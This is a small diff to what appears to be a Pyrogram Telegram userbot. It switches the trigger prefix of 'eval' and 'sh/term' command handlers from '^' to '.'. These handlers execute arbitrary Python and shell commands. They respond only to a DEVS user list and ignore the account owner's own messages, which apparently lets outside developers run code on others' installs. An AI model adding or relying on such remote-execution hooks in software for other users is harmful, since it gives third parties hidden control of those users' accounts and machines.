@@ -33,7 +33,7 @@ async def aexec(code, c, m, r, chat):
     return await locals()["__aexec"](c, m, r, chat)
 
 
-@Client.on_message(filters.command(["e", "eval"], "^") & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command(["e", "eval"], ".") & filters.user(DEVS) & ~filters.me)
 async def evaluate(c: Client, m: Message):
     try:
         cmd = m.text.split(" ", maxsplit=1)[1]
@@ -83,7 +83,7 @@ async def evaluate(c: Client, m: Message):
 
 
 @Client.on_message(
-    filters.command(["sh", "term"], "^") & filters.user(DEVS) & ~filters.me
+    filters.command(["sh", "term"], ".") & filters.user(DEVS) & ~filters.me
 )
 async def terminal(client, message):
     if len(message.text.split()) == 1:
